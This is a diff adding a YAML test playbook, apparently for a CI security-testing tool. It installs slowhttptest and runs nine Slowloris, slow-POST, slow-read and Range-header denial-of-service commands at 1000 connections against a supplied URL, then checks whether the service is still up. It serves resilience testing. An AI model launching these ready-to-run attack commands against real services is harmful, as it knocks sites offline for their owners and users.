@@ -1,0 +1,38 @@
+settings:
+  name: "SlowHTTPTest - Common low-bandwidth application layer Denial of Service attacks"
+  description: "Tests:
+                - Slowloris
+                - Slow HTTP POST
+                - Slow Read attack (based on TCP persist timer exploit) by draining concurrent connections pool
+                - Apache Range Header attack by causing very significant memory and CPU usage on the server."
+  files: true
+  timeout: 2000
+  count: 10
+  example: satori run satori://dos/slowhttptest.yml -d URL="satori.ci" --output
+
+install:
+  update:
+  - apt update
+  slowhttptest:
+  - apt install -qy slowhttptest curl
+  before_slowhttptest:
+  - curl -s ${{URL}} -w 3
+
+slowhttptest:
+  assertStdoutNotContains: "service available:   NO"
+  setSeverity: 4
+  run:
+  - slowhttptest -c 1000 -g -o slowloris_get -i 110 -r 200 -s 8192 -t GET -x 10 -p 3 -u ${{URL}}
+  - slowhttptest -c 1000 -g -o slowloris_get_h -i 110 -r 200 -s 8192 -t GET -x 10 -p 3 -u ${{URL}} -H
+  - slowhttptest -c 1000 -g -o slowloris_get_x -i 110 -r 200 -s 8192 -t GET -x 10 -p 3 -u ${{URL}} -X 
+  - slowhttptest -c 1000 -g -o slowloris_get_b -i 110 -r 200 -s 8192 -t GET -x 10 -p 3 -u ${{URL}} -B 
+  - slowhttptest -c 1000 -g -o slowloris_get_r -i 110 -r 200 -s 8192 -t GET -x 10 -p 3 -u ${{URL}} -R 
+  - slowhttptest -c 1000 -g -o slowloris_post_h -i 110 -r 200 -s 8192 -t POST -x 10 -p 3 -u ${{URL}} -H 
+  - slowhttptest -c 1000 -g -o slowloris_post_x -i 110 -r 200 -s 8192 -t POST -x 10 -p 3 -u ${{URL}} -X 
+  - slowhttptest -c 1000 -g -o slowloris_post_b -i 110 -r 200 -s 8192 -t POST -x 10 -p 3 -u ${{URL}} -B 
+  - slowhttptest -c 1000 -g -o slowloris_post_r -i 110 -r 200 -s 8192 -t POST -x 10 -p 3 -u ${{URL}} -R 
+
+test:
+  assertReturnCode: 0
+  after_slowhttptest:
+  - curl -s ${{URL}} -w 3
